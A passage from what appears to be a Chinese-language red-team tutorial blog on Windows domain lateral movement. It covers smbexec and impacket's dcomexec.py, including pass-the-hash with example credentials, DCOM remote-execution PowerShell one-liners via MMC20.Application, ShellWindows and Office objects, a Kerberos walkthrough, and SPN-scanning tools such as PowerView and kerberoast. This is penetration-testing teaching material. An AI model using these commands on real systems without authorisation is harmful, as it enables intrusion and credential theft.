href="https://github.com/sunorr/smbexec">https://github.com/sunorr/smbexec</a></p><p>一看这个项目是 8 年前上传的了，然后试了用 VS2019 没编译成功，而且目前各大杀软也都查杀这个工具了，所以这个就不看了，直接看 impacket 里的同类工具。</p><h3 id="impacket-版"><a href="#impacket-版" class="headerlink" title="impacket 版"></a>impacket 版</h3><p>在 impacket 工具包里包含了 smbexec.py 工具，使用起来也很简单。</p><pre class="line-numbers language-none"><code class="language-none">python3 smbexec.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902153131.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="Linux-跨平台-Windows-远程命令执行"><a href="#Linux-跨平台-Windows-远程命令执行" class="headerlink" title="Linux 跨平台 Windows 远程命令执行"></a>Linux 跨平台 Windows 远程命令执行</h3><p>smbexec 工具包下载地址：<a href="https://github.com/brav0hax/smbexec">https://github.com/brav0hax/smbexec</a></p><p>这里安装以 Kali 为例</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;brav0hax&#x2F;smbexec.gitcd smbexec&#x2F;chmod +x install.shsudo .&#x2F;install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装时需要选择操作系统，根据自己情况选择就行，如果是 Kali 就选择 Debain，然后选择安装目录，直接回车默认 /opt 目录即可。</p><p>安装完后，在终端里输入 smbexec 就会显示 smbexec 的主菜单，分别如下：</p><pre class="line-numbers language-none"><code class="language-none">1. System Enumeration   &#x2F;&#x2F; 获取系统信息2. System Exploitation  &#x2F;&#x2F; 执行系统命令3. Obtain Hashes        &#x2F;&#x2F; 获取系统哈希4. Options              &#x2F;&#x2F; 一些其他操作5. Exit                 &#x2F;&#x2F; 退出<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择菜单 1 System Enumeration 有以下选项：</p><pre class="line-numbers language-none"><code class="language-none">1. Create a host list                 &#x2F;&#x2F; 扫描目标 IP 段中存活的主机2. Check systems for Domain Admin     &#x2F;&#x2F; 获取目标系统中的管理员3. Check systems for logged in users  &#x2F;&#x2F; 获取当前登录目标系统的用户4. Check systems for UAC              &#x2F;&#x2F; 获取目标系统 UAC 的状态5. Enumerate Shares                   &#x2F;&#x2F; 获取目标系统中的网络共享目录6. File Finder                        &#x2F;&#x2F; 搜索目标系统中的敏感文件7. Remote login validation            &#x2F;&#x2F; 获取目标系统中远程登录的用户8. Main menu                          &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择菜单 2 System Exploitation 有以下选项：</p><pre class="line-numbers language-none"><code class="language-none">1. Create an executable and rc script    &#x2F;&#x2F; 生成一个 meterpreter Payload 并在目标系统中运行它2. Disable UAC                           &#x2F;&#x2F; 关闭远程主机的 UAC3. Enable UAC                            &#x2F;&#x2F; 开启远程主机的 UAC4. Execute Powershell                    &#x2F;&#x2F; 执行一个 PowerShell 脚本5. Get Shell                             &#x2F;&#x2F; 使用基于 PsExec 的方式获得目标系统的 Shell6. In Memory Meterpreter via Powershell  &#x2F;&#x2F; 通过 PowerShell 在内存中插入 Meterpreter Payload7. Remote system access                  &#x2F;&#x2F; 远程访问系统8. Main menu                             &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择菜单 3 Obtain Hashes 有以下选项：</p><pre class="line-numbers language-none"><code class="language-none">1. Domain Controller            &#x2F;&#x2F; 获取域控哈希2. Workstation &amp; Server Hashes  &#x2F;&#x2F; 获取本地哈希3. Main menu                    &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择菜单 4 Options 有以下选项：</p><pre class="line-numbers language-none"><code class="language-none">1. Save State            &#x2F;&#x2F; 保存当前状态2. Load State            &#x2F;&#x2F; 加载以前保存的状态3. Set Thread Count      &#x2F;&#x2F; 设置线程数4. Generate SSL Cert     &#x2F;&#x2F; 生成 SSL 证书5. Enter Stealth Mode    &#x2F;&#x2F; 进入安静模式6. About                 &#x2F;&#x2F; 关于7. Main menu             &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取目标系统 UAC 的状态</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902163458.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>获取目标系统中的网络共享目录</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902163631.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>获取本地哈希</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902161205.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、DCOM-在远程系统中的使用"><a href="#2、DCOM-在远程系统中的使用" class="headerlink" title="2、DCOM 在远程系统中的使用"></a>2、DCOM 在远程系统中的使用</h2><p>COM 即组件对象模型 (Component Object Model，COM) ，是基于 Windows 平台的一套组件对象接口标准，由一组构造规范和组件对象库组成。</p><p>COM 是许多微软产品和技术如 Windows 媒体播放器和 Windows Server 的基础。</p><p>DCOM （分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，DCOM 是 COM（组件对象模型）的扩展。</p><p>它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是 Internet 上，利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。</p><p>攻击者可使用 DCOM 进行横向移动，通过 DCOM 攻击者可在拥有适当权限的情况下通过 Office 应用程序以及包含不安全方法的其他 Windows 对象远程执行命令。</p><p>使用 DCOM 进行横向移动的优势之一在于，在远程主机上执行的进程将会是托管 COM 服务器端的软件。例如我们滥用 ShellBrowserWindow COM 对象，那么就会在远程主机的现有 explorer.exe 进程中执行。</p><p>对攻击者而言，这无疑能够增强隐蔽性，由于有大量程序都会向 DCOM 公开方法，因此防御者较难以监测所有程序。</p><h3 id="在本地通过-DCOM-执行命令"><a href="#在本地通过-DCOM-执行命令" class="headerlink" title="在本地通过 DCOM 执行命令"></a>在本地通过 DCOM 执行命令</h3><p>1、获取 DCOM 程序列表</p><p>Get-CimInstance 是 PowerShell 3.0 以上的版本自带的，因此只有 Windows Server 2012 及以上的操作系统才会自带 Get-CimInstance 命令</p><pre class="line-numbers language-none"><code class="language-none">Get-CimInstance Win32_DCOMApplication<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Windows 7 和 Windows Server 2008 中可以使用 Get-WmiObject 替代 Get-CimInstance</p><pre class="line-numbers language-none"><code class="language-none">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2、使用 DCOM 执行任意命令</p><p>在 DCOM 程序列表中有个 MMC Application Class（MMC20.Application），这个 COM 对象可以编程 MMC 管理单元操作的组件脚本。</p><p>在本地以管理员权限启动一个 PowerShell，并执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得COM对象的实例后，还可以执行如下命令枚举这个 COM 对象中的不同方法和属性</p><pre class="line-numbers language-none"><code class="language-none">$com.Document.ActiveView | Get-Member<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 MMC20.Application 中有个 ExecuteShellCommand 方法，我们可以拿它来执行命令，比如启动个计算器</p><pre class="line-numbers language-none"><code class="language-none">$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902171015.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>除了 MMC20.Application 还有 ShellWindows、ShellBrowserWindow、Excel.Application 以及 Outlook.Application 等等可以被我们利用。</p><h3 id="使用-DCOM-在远程主机上执行命令"><a href="#使用-DCOM-在远程主机上执行命令" class="headerlink" title="使用 DCOM 在远程主机上执行命令"></a>使用 DCOM 在远程主机上执行命令</h3><p>在使用该方法时，需要具备以下条件：</p><ul><li>具有本地管理员权限的 PowerShell</li><li>需要关闭目标系统的防火墙。</li><li>在远程主机上执行命令时，必须使用域管的 administrator 账户或者在目标主机上具有管理员权限的账户</li></ul><p>1、调用 MMC20.Application 远程执行命令</p><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.7.7&quot;))$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)或者[Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.7.7&quot;)).Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902175722.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>2、调用 ShellWindows 远程执行命令</p><pre class="line-numbers language-none"><code class="language-none">$com&#x3D;[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.7.7&quot;))$com.item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)或者[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.7.7&quot;)).item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902175207.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>以上这两种方法均适用于Windows 7、Windows 10、Windows Server 2008、Windows Server 2016 的系统。</p><p>除了 MMC20.Application 和 ShellWindows，还有以下这几种 DCOM 对象可以被利用。</p><p>3、调用 Excel.Application 远程执行命令</p><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromprogID(&quot;Excel.Application&quot;,&quot;192.168.7.7&quot;))$com.DisplayAlerts &#x3D; $false$com.DDEInitiate(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4、调用 ShellBrowserWindow 远程执行命令</p><blockquote><p>适用于 Windows 10 和 Windows Server 2012 R2 等版本的系统</p></blockquote><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;,&quot;192.168.7.7&quot;))$com.Document.Application.shellExecute(&quot;calc.exe&quot;)或者[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;,&quot;192.168.3.144&quot;)).Document.Application.shellExecute(&quot;calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>5、调用 Visio.Application 远程执行命令</p><blockquote><p>前提是目标安装了 Visio</p></blockquote><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Visio.Application&quot;,&quot;192.168.7.7&quot;))$com.[0].Document.Application.shellExecute(&quot;calc.exe&quot;)或者[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Visio.Application&quot;,&quot;192.168.7.7&quot;)).[0].Document.Application.shellExecute(&quot;calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>6、调用 Outlook.Application 远程执行命令</p><blockquote><p>前提是目标安装了 Outlook</p></blockquote><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Outlook.Application&quot;,&quot;192.168.7.7&quot;))$com.createObject(&quot;Shell.Application&quot;).shellExecute(&quot;192.168.7.7&quot;)或者[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Outlook.Application&quot;,&quot;192.168.7.7&quot;)).createObject(&quot;Shell.Application&quot;).shellExecute(&quot;calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="dcomexec-py-脚本"><a href="#dcomexec-py-脚本" class="headerlink" title="dcomexec.py 脚本"></a>dcomexec.py 脚本</h3><p>Impacket 工具包里也提供了 DCOM 的利用脚本，该脚本可以提供一个类似于 wmiexec.py 脚本的半交互式 shell，不过使用的是 DCOM</p><p>dcomexec.py 脚本目前支持 MMC20.Application、ShellWindows 和 ShellBrowserWindow 对象。</p><pre class="line-numbers language-none"><code class="language-none">python3 dcomexec.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者只执行一条命令</p><pre class="line-numbers language-none"><code class="language-none">python3 dcomexec.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7 ipconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果只知道 hash 也可以用 hash 去连接</p><pre class="line-numbers language-none"><code class="language-none">python3 dcomexec.py teamssix.com&#x2F;administrator@192.168.7.7 -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210904110328.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x24-SPN-的应用"><a href="#0x24-SPN-的应用" class="headerlink" title="0x24 SPN 的应用"></a>0x24 SPN 的应用</h1><h2 id="0、前言-5"><a href="#0、前言-5" class="headerlink" title="0、前言"></a>0、前言</h2><h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>Windows 域环境是基于微软的活动目录服务工作的，它在网络系统环境中将物理位置分散、所属部门不同的用户进行分组和集中资源，有效地对资源访问控制权限进行细粒度的分配，提高了网络环境的安全性及网络资源统一分配管理的便利性。</p><p>在域环境中运行的大量应用包含了多种资源，为了对资源的合理分类和再分配提供便利，微软给域内的每种资源分配了不同的服务主题名称即 SPN (Service Principal Name）</p><h3 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h3><p>Kerberos 是由 MIT 提出的一种网络身份验证协议，旨在通过密钥加密技术为客户端/服务器应用程序提供强身份验证，它也是主要用在域环境下的身份认证协议。</p><p>在 Kerberos 认证中，最主要的问题就是如何证明「你是你」的问题，比如当一个用户去访问服务器上的某服务时，服务器如何判断该用户是否有权限来访问自己主机上的服务，同时保证在这个过程中的通讯内容即使被拦截或篡改也不会影响通讯的安全性，这正是 Kerberos 解决的问题。</p><p>Kerberos 协议中的名称解释：</p><ul><li>Client: 访问服务的客户端</li><li>Server: 提供服务的服务器</li><li>KDC (Key Distribution Center): 密钥分发中心</li><li>AS (Authentication Service): 认证服务器</li><li>TGS (Ticket Granting Service): 票据授予服务</li><li>DC (Domain Controller): 域控制器</li><li>AD (Account Database): 用户数据库</li><li>TGT (Ticket Granting Ticket): 票证授予票证</li><li>ST (Servre Ticket): 服务票据</li></ul><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210906154732.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>根据上图，这里一步一步进行解释</p><p><strong>第一阶段：Clinet 与 AS</strong></p><p>① 客户端向认证服务器 AS 发起请求，请求内容为自己的用户名、主机 IP 和当前时间戳。</p><p>② AS 接收到请求，此时 AS 会根据用户名在用户数据库 AD 中寻找，判断这个用户名在不在白名单里，此时只会查找具有相同用户名的用户，并不会判断身份的可靠性；如果没有该用户名，认证失败；如果存在该用户名，则 AS 便认为用户存在，此时 AS 对客户端做出响应，响应内容包含两部分：</p><ul><li>第一部分：票据授予票据 TGT，客户端需要使用 TGT 去密钥分发中心 KDC 中的票据授予服务 TGS 获取访问网络服务所需的票据，TGT 中包含的内容有 kerberos 数据库中存在的客户端信息、IP、当前时间戳 </li><li>第二部分：使用客户端密钥加密的一段内容，这段内容包括：用于客户端和 TGS 之间通信的 Session_Key (CT_SK) ，客户端即将访问的 TGS 信息以及 TGT 的有效时间和一个当前时间戳，该部分内容使用客户端密钥加密，所以客户端在拿到该部分内容时可以通过自己的密钥解密。</li></ul><p>至此，第一阶段通信完成。</p><p><strong>第二阶段：Clinet 与 TGS</strong></p><p>此时客户端已经获取到了 AS 返回的消息，客户端会将 AS 返回的第二部分内容进行解密，分别获得时间戳、接下来要访问的 TGS 信息以及用于和 TGS 通信的密钥 CT_SK</p><p>首先客户端会判断时间戳与自己发出的时间差是否大于 5 分钟，如果大于 5 分钟那就认为这个 AS 是伪造的，认证失败，否则就继续准备向 TGS 发起请求。</p><p>③ 客户端向 TGS 发起请求，请求的内容包含三部分：</p><ul><li>第一部分：使用 CT_SK 加密的客户端信息、IP、时间戳</li><li>第二部分：自己想要访问的 Server 服务信息（明文形式）</li><li>第三部分：使用 TGS 密钥加密的 TGT</li></ul><p>④ TGS 接收到请求，首先判断当前系统是否存在客户端想要访问的 Server 服务，如果不存在，认证失败，如果存在则继续接下来的认证。</p><pre><code>接下来 TGS 利用自己的秘钥解密 TGT 内容，此时 TGS 获取到经过 AS 认证后的用户信息、CT_SK、时间戳信息，通过时间戳判断此次请求时延是否正常，如果时延正常就继续下一步。之后 TGS 会使用 CT_SK 解密客户端发来的第一部分内容，取出其中的用户信息和 TGT 里的用户信息进行对比，如果全部一致则认为客户端身份正常，继续下一步。此时 TGS 将向客户端发起响应，响应信息包含两部分：</code></pre><ul><li>第一部分：使用服务端密码加密的服务票据 ST，其中包括客户端信息、IP、客户端待访问的服务端信息、ST 有效信息、时间戳以及用于客户端和服务端之间通信的 CS_SK</li><li>第二部分：使用 CT_SK 加密的内容，其中包括 CS_SK 、时间戳和 ST 的有效时间。</li></ul><p>至此，第二阶段通信完成。</p><p><strong>第三阶段：Clinet 与 Server</strong></p><p>此时客户端收到来自 TGS 的响应，并使用本地缓存的 CT_SK 解密出 TGS 返回的第二部分内容，检查时间戳无误后，取出 CS_SK 准备向服务端发起请求。这里由于 TGS 返回的第一部分信息是用的服务端秘钥加密的，因此这里的客户端是无法进行解密的。</p><p>⑤ 客户端向服务端发送请求，请求内容包括两部分：</p><ul><li>第一部分：利用 CS_SK 将自己的主机信息和时间戳进行加密的信息</li><li>第二部分：第 ④ 步里 TGS 向客户端返回的第一部分内容，即使用服务端密码加密的服务票据 ST</li></ul><p>⑥ 服务端此时收到了来自客户端的请求，它会使用自己的密钥解密客户端发来的第二部分内容，核对时间戳之后，取出 CS_SK，利用 CS_SK 解密第一部分内容，从而获得经过 TGS 认证后的客户端信息。</p><p>此时服务端会将第一部分解密后的信息与第二部分解密后的信息进行对比，如果一致则说明该客户端身份为真实身份，此时服务端向客户端响应使用 CS_SK 加密的表示接受的信息，客户端接受到信息后也确认了服务端的真实性。</p><p>至此，第三阶段通信完成，到这里整个 kerberos 认证也就完成了，接下来客户端与服务端就能放心的进行通信了。</p><p>这里可以再通过时序图加深下印象。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210906174237.jpg?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>注意点：</p><ul><li>KDC 服务默认会安装在一个域的域控中</li><li>Kerberos 认证采用对称加密算法</li><li>三个阶段里都使用了密钥，这些密钥都是临时生成的，也只在一次会话中生效，因此即使密钥被劫持，等到密钥被破解可能这次会话也都早已结束。</li><li>AD 其实是一个类似于本机 SAM 的一个数据库，全称叫 Account Database，存储所有 Client 白名单，只有存在于白名单的 Client 才能顺利申请到 TGT</li><li>KDC 服务框架中包含一个 KRBTGT 账户，它是在创建域时系统自动创建的一个账号，可以暂时理解为它就是一个无法登陆的账号，在发放票据时会使用到它的密码 HASH 值。</li></ul><h2 id="1、SPN"><a href="#1、SPN" class="headerlink" title="1、SPN"></a>1、SPN</h2><h3 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h3><p>在使用 Kerberos 协议进行身份验证的网络中，必须在内置账号（NetworkService、LocalSystem）或者用户账号下为服务器注册 SPN。</p><p>对于内置账号，SPN 将自动进行注册，如果在域用户账号下运行服务，则必须为要使用的账号手动注册 SPN。</p><p>因为域环境中的每台服务器都需要在 Kerberos 身份验证服务中注册 SPN ，所以 RT 会直接向域控制器发送查询请求，获取需要的服务的 SPN ，从而知道自己需要使用的服务资源在哪台机器上。</p><p>SPN 格式如下：</p><pre class="line-numbers language-none"><code class="language-none">serviceclass &quot;&#x2F;&quot; hostname [&quot;:&quot;port] [&quot;&#x2F;&quot; servicename]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>serviceclass（必选）：服务组件名称</p><p>hostname（必选）：以 “/” 与后面的名称分隔，这里的 hostname 是计算机的 FQDN (全限定域名，同时带有计算机名和域名)</p><p>port（可选）：以冒号分隔，后面的内容为该服务监听的端口号</p><p>servicename（可选）：一个字符串，可以是服务的专有名称（DN）、objectGuid、Internet主机名或全限定域名</p></blockquote><h3 id="常见-SPN-服务"><a href="#常见-SPN-服务" class="headerlink" title="常见 SPN 服务"></a>常见 SPN 服务</h3><p>MSSQL 服务</p><pre class="line-numbers language-none"><code class="language-none">MSSQLSvc&#x2F;DBServer.teamssix.com:1433<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Exchange 服务</p><pre class="line-numbers language-none"><code class="language-none">exchangeMDB&#x2F;ExServer.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>RDP 服务</p><pre class="line-numbers language-none"><code class="language-none">TERMSRV&#x2F;ExServer.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>WSMan/WinRM/PSRemoting 服务</p><pre class="line-numbers language-none"><code class="language-none">WSMAN&#x2F;ExServer.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="SPN-扫描脚本"><a href="#SPN-扫描脚本" class="headerlink" title="SPN 扫描脚本"></a>SPN 扫描脚本</h3><p>SPN 扫描也叫「扫描 Kerberos 服务实例名称」，在活动目录中发现服务的最佳方法就是 SPN 扫描。</p><p>SPN 扫描通过请求特定 SPN 类型的服务主体名称来查找服务，与网络端口相比，SPN 扫描的主要特点是不需要通过连接网络中的每个 IP 地址来检查服务端口，因此不会因触发内网中的安全设备规则而产生大量的告警日志。</p><p>由于 SPN 查询是 Kerberos 票据行为的一部分，所以检测难度较大。</p><h4 id="setspn"><a href="#setspn" class="headerlink" title="setspn"></a>setspn</h4><p>setspn 是 Windows 自带命令，以下命令可列出域中所有的 SPN 信息</p><pre class="line-numbers language-none"><code class="language-none">setspn -T teamssix -Q *&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Active-Directory-模块"><a href="#Active-Directory-模块" class="headerlink" title="Active Directory 模块"></a>Active Directory 模块</h4><p>PowerShell 模块 Active Directory 只在域控上有</p><pre class="line-numbers language-none"><code class="language-none">Import-Module ActiveDirectoryget-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用大佬导出的模块，这样普通用户也可以使用该模块，下载地址：<a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Microsoft.ActiveDirectory.Management.dllget-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><p>PowerView 下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\PowerView.ps1Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,last<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Powershell-AD-Recon"><a href="#Powershell-AD-Recon" class="headerlink" title="Powershell-AD-Recon"></a>Powershell-AD-Recon</h4><p>Powershell-AD-Recon 提供了一系列获取服务与服务登录账号和运行服务的主机之间的对应关系的工具，这些服务包括但不限于 MSSQL、Exchange、RDP、WinRM</p><p>Powershell-AD-Recon 下载地址：<a href="https://github.com/PyroTek3/PowerShell-AD-Recon">https://github.com/PyroTek3/PowerShell-AD-Recon</a></p><p>Powershell-AD-Recon 工具包里的内容如下：</p><pre class="line-numbers language-none"><code class="language-none">Discover-PSInterestingServices# 查找所有 SPN 服务Discover-PSMSExchangeServers# 查找 Exchange 服务器Discover-PSMSSQLServers         # 查找 MSSQL 服务器Find-PSServiceAccounts          # 查找服务账户Get-DomainKerberosPolicy        # 获取域 Kerberos 策略Get-PSADForestInfo              # 获取域森林信息Get-PSADForestqInfo             # 获取域森林 KRBTGT 信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>下载后的文件是没有 .ps1 后缀的，需要自己添加上</p></blockquote><p>由于 SPN 是通过 LDAP 协议向域控制器进行查询的，因此 RT 需要获得一个普通的域用户权限才可以进行 SPN 扫描。</p><p>将 PowerShell 脚本导入并执行，以 MSSQL 服务为例</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Discover-PSMSSQLServers.ps1Discover-PSMSSQLServers或者PowerShell -Exec bypass -C &quot;Import-Module .\Discover-PSMSSQLServers.ps1;Discover-PSMSSQLServers&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>扫描域中所有的 SPN 信息</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Discover-PSInterestingServices.ps1Discover-PSInterestingServices或者PowerShell -Exec bypass -C &quot;Import-Module .\Discover-PSInterestingServices.ps1;Discover-PSInterestingServices&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="kerberoast"><a href="#kerberoast" class="headerlink" title="kerberoast"></a>kerberoast</h4><p>kerberoast 工具包里的 GetUserSPNs.ps1，可以帮助我们发现仅与用户帐户相关联的服务。</p><p>kerberoast 下载地址：<a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;GetUserSPNs.ps1或者PowerShell -Exec bypass -File GetUserSPNs.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>kerberoast 工具包里的 GetUserSPNs.vbs 也能实现相同的功能</p><pre class="line-numbers language-none"><code class="language-none">cscript.exe GetUserSPNs.vbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="PowerShellery"><a href="#PowerShellery" class="headerlink" 